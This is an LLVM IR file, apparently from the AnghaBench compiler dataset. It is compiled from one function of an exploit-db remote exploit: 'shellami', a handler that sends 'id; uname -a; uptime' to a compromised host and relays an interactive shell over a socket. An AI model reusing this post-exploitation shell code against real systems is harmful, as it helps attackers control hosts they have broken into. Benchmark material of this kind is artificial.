; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_33877.c_shellami.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_33877.c_shellami.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [22 x i8] c"id; uname -a; uptime\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"shellami: select() - %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [46 x i8] c"shellami: connection closed by foreign host.\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@stdout = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i32)* @shellami to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @shellami(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1024 x i8], align 16
  %6 = alloca i8*, align 8
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  %7 = load i32, i32* %2, align 4
  %8 = load i8*, i8** %6, align 8
  %9 = load i8*, i8** %6, align 8
  %10 = call i32 @strlen(i8* %9)
  %11 = call i32 @sock_send(i32 %7, i8* %8, i32 %10)
  br label %12

12:                                               ; preds = %1, %69
  %13 = call i32 @FD_ZERO(i32* %4)
  %14 = load i32, i32* %2, align 4
  %15 = call i32 @FD_SET(i32 %14, i32* %4)
  %16 = load i32, i32* @STDIN_FILENO, align 4
  %17 = call i32 @FD_SET(i32 %16, i32* %4)
  %18 = load i32, i32* %2, align 4
  %19 = add nsw i32 %18, 1
  %20 = call i64 @select(i32 %19, i32* %4, i32* null, i32* null, i32* null)
  %21 = icmp slt i64 %20, 0
  br i1 %21, label %22, label %29

22:                                               ; preds = %12
  %23 = load i32, i32* @stderr, align 4
  %24 = load i32, i32* @errno, align 4
  %25 = call i8* @strerror(i32 %24)
  %26 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i8* %25)
  %27 = load i32, i32* @EXIT_FAILURE, align 4
  %28 = call i32 @exit(i32 %27) #3
  unreachable

29:                                               ; preds = %12
  %30 = load i32, i32* %2, align 4
  %31 = call i64 @FD_ISSET(i32 %30, i32* %4)
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %51

33:                                               ; preds = %29
  %34 = load i32, i32* %2, align 4
  %35 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %36 = call i32 @sock_recv(i32 %34, i8* %35, i32 1023)
  store i32 %36, i32* %3, align 4
  %37 = icmp sle i32 %36, 0
  br i1 %37, label %38, label %43

38:                                               ; preds = %33
  %39 = load i32, i32* @stderr, align 4
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %39, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.2, i64 0, i64 0))
  %41 = load i32, i32* @EXIT_SUCCESS, align 4
  %42 = call i32 @exit(i32 %41) #3
  unreachable

43:                                               ; preds = %33
  %44 = load i32, i32* %3, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 %45
  store i8 0, i8* %46, align 1
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %48 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %47)
  %49 = load i32, i32* @stdout, align 4
  %50 = call i32 @fflush(i32 %49)
  br label %51

51:                                               ; preds = %43, %29
  %52 = load i32, i32* @STDIN_FILENO, align 4
  %53 = call i64 @FD_ISSET(i32 %52, i32* %4)
  %54 = icmp ne i64 %53, 0
  br i1 %54, label %55, label %69

55:                                               ; preds = %51
  %56 = load i32, i32* @STDIN_FILENO, align 4
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %58 = call i32 @read(i32 %56, i8* %57, i32 1023)
  store i32 %58, i32* %3, align 4
  %59 = icmp sgt i32 %58, 0
  br i1 %59, label %60, label %68

60:                                               ; preds = %55
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 %62
  store i8 0, i8* %63, align 1
  %64 = load i32, i32* %2, align 4
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %66 = load i32, i32* %3, align 4
  %67 = call i32 @sock_send(i32 %64, i8* %65, i32 %66)
  br label %68

68:                                               ; preds = %60, %55
  br label %69

69:                                               ; preds = %68, %51
  br label %12
}

declare dso_local i32 @sock_send(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i8* @strerror(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @sock_recv(i32, i8*, i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
